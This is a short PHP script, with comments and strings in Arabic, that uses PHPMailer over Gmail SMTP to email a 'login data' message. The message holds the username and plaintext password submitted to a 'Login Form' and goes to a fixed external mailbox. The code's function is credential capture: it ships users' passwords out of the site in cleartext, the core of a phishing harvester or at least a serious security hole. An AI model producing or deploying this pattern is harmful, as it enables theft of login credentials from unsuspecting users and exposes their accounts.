<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

try {
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com'; // مزود SMTP الخاص بك
    $mail->SMTPAuth = true;
    $mail->Username = 'your-email@gmail.com'; // بريدك الإلكتروني
    $mail->Password = 'your-email-password'; // كلمة مرور بريدك
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->setFrom('your-email@gmail.com', 'Login Form');
    $mail->addAddress('your-email@example.com');

    $mail->isHTML(false);
    $mail->Subject = 'بيانات تسجيل الدخول';
    $mail->Body = "اسم المستخدم: $username\nكلمة المرور: $password";

    $mail->send();
    echo "تم إرسال البريد بنجاح.";
} catch (Exception $e) {
    echo "فشل إرسال البريد. الخطأ: {$mail->ErrorInfo}";
}
?>
